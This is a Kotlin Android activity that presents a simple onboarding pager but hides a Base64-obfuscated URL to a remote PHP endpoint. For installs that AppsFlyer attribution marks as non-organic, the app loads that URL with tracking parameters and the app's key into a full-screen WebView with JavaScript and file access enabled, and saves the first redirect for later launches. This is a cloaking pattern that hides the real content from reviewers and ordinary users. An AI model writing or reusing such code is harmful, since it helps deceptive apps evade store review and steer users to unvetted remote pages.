package org.wbacademy.wb

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.viewpager2.widget.ViewPager2
import androidx.viewpager2.widget.ViewPager2.OnPageChangeCallback
import org.wbacademy.wb.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {


    private lateinit var binding: ActivityMainBinding
    var linkBuilderOffer = "aHR0cDovL2Q2ODQ3MGdpLmJlZ2V0LnRlY2gvV2JtL2Zvci5waHA/aWQ9YXBw"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.pager.adapter = PagerAdapter(this)
        //binding.pager.offscreenPageLimit = 3
        binding.pager.registerOnPageChangeCallback( object : OnPageChangeCallback(){
            override fun onPageSelected(position: Int) {
                super.onPageSelected(position)
                if(4==position+1) {
                    binding.floatingActionButton.visibility = View.INVISIBLE
                } else binding.floatingActionButton.visibility = View.VISIBLE
            }
        })
        binding.floatingActionButton.setOnClickListener {
            binding.pager.currentItem = binding.pager.currentItem+1
        }
       if(getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)==null) {
           Log.d("TAG","FFFF")
           Handler(Looper.getMainLooper()).postDelayed({
               checkSource()
           },5000)
       } else {
           Log.d("TAG","GGGGG")
           createWebView()
           binding.web.loadUrl(getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)!!)
           binding.web.visibility = View.VISIBLE
           binding.floatingActionButton.visibility = View.GONE
       }
    }
    fun decoderBase64(string: String): String {
        val decode = Base64.decode(string, Base64.DEFAULT)
        return String(decode)
    }

    private fun checkSource(){
        linkBuilderOffer = decoderBase64(linkBuilderOffer)
        when {
            af_status == "Non-organic" -> {
                linkBuilderOffer += "&sub1=${sub1}&sub2=${sub2}&sub3=${sub3}&sub4=${sub4}&sub5=${sub5}&af_id=${af_id}&bundle=$packageName&key=$appsflyer_key&ad=$ad"
                loadWebView()
            }
            else -> {

            }
        }
    }

    private fun loadWebView(){
        createWebView()
        binding.floatingActionButton.visibility = View.GONE
        binding.web.visibility = View.VISIBLE
        Log.e("onPageFinished", linkBuilderOffer.toString())
        Log.d("TAG",linkBuilderOffer.toString())
        if(getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)!=null)
            linkBuilderOffer = getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)!!
        binding.web.loadUrl(linkBuilderOffer)
    }

    private fun createWebView(){
        binding.web.settings.apply {
            defaultTextEncodingName = "utf-8"
            allowFileAccess = true
            javaScriptEnabled = true
            loadWithOverviewMode = true
            domStorageEnabled = true
            databaseEnabled = true
            useWideViewPort = true
            javaScriptCanOpenWindowsAutomatically = true
            mixedContentMode = 0
        }

        binding.web.webViewClient = object : WebViewClient(){
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d("TAG",url.toString().lastIndexOf("null").toString()+" "+url.toString().indexOf("null").toString())
                if(url.toString().lastIndexOf("null")==url.toString().indexOf("null")) binding.web.visibility = View.INVISIBLE
            }

            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                Log.d("TAG",request?.url.toString()+" ||||")
                if(getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)==null) {
                    getSharedPreferences("prefs", MODE_PRIVATE)
                        .edit()
                        .putString("url",request?.url.toString())
                        .apply();
                }
                view?.loadUrl(request?.url.toString())
                return true
            }
        }
        binding.web.webChromeClient = object : WebChromeClient(){}
    }
}